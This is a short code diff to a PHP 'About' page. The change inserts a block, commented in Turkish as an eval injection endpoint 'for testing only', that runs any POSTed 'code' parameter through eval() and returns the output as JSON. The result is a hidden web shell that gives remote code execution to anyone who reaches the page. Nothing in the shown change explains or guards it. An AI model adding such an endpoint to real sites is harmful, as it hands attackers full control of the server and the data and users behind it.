@@ -2,6 +2,20 @@
 <?php
 $title = "About";
 include '../includes/header.php'; 
+
+// Eval Injection Endpoint (Sadece Test Amaçlı)
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['code'])) {
+    $input = $_POST['code']; // Kullanıcı girdisi
+    try {
+        // Kullanıcı girdisini eval() ile çalıştır
+        $result = eval($input);
+        echo json_encode(["output" => $result]); // Sonucu JSON olarak döndür
+    } catch (Throwable $e) {
+        // Hata durumunda mesaj döndür
+        echo json_encode(["error" => $e->getMessage()]);
+    }
+    exit; // Ana sayfa içeriğinin yüklenmesini engelle
+}
 ?>
 
 <main class="about-main">
